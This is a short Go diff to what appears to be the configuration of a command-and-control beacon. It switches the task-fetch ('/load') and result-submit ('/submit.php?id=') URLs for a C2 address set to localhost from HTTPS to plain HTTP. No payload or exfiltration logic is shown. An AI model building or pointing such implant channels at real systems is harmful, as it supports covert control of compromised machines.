@@ -15,8 +15,8 @@ var (
 	C2        = "127.0.0.1:443"
 	plainHTTP = "http://"
 	sslHTTP   = "https://"
-	GetUrl    = sslHTTP + C2 + "/load"
-	PostUrl   = sslHTTP + C2 + "/submit.php?id="
+	GetUrl    = plainHTTP + C2 + "/load"
+	PostUrl   = plainHTTP + C2 + "/submit.php?id="
 	WaitTime  = 10000 * time.Millisecond
 	VerifySSLCert = true
 	TimeOut time.Duration  = 10 //seconds
